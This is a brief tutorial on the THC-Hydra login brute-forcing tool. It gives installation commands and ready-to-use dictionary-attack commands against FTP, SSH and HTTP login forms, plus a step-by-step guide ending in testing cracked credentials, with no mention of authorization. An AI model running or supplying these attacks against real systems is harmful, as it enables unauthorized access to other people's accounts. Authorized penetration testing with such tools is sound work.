What is Hydra?

Hydra (also known as THC-Hydra) is a fast and flexible tool for conducting brute-force attacks on login credentials. It supports multiple protocols including HTTP, FTP, SSH, Telnet, SMB, RDP, and more.

Key Features

  • Fast and reliable login cracker
  • Supports dictionary attacks on over 50 protocols
  • Parallel attack threads for speed
  • Command-line interface for automation

Installation

On Termux (Android):

pkg update && pkg install hydra

On Kali Linux:

sudo apt-get install hydra

Verify Installation:

hydra -h

Common Hydra Usage Examples

FTP Brute-force Attack

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

SSH Brute-force

hydra -l root -P passwords.txt ssh://192.168.1.100

HTTP Login Form Attack

hydra -L usernames.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

Step-by-Step Guide

  1. Gather target IP or domain
  2. Know the login protocol (FTP, SSH, etc.)
  3. Create or find wordlists for usernames and passwords
  4. Use appropriate Hydra command
  5. Analyze results and test discovered credentials

Important Protocols Supported by Hydra

  • ftp, ssh, telnet, smtp, pop3, imap
  • http-get, http-post, https-form
  • smb, rdp, vnc, mysql, mssql
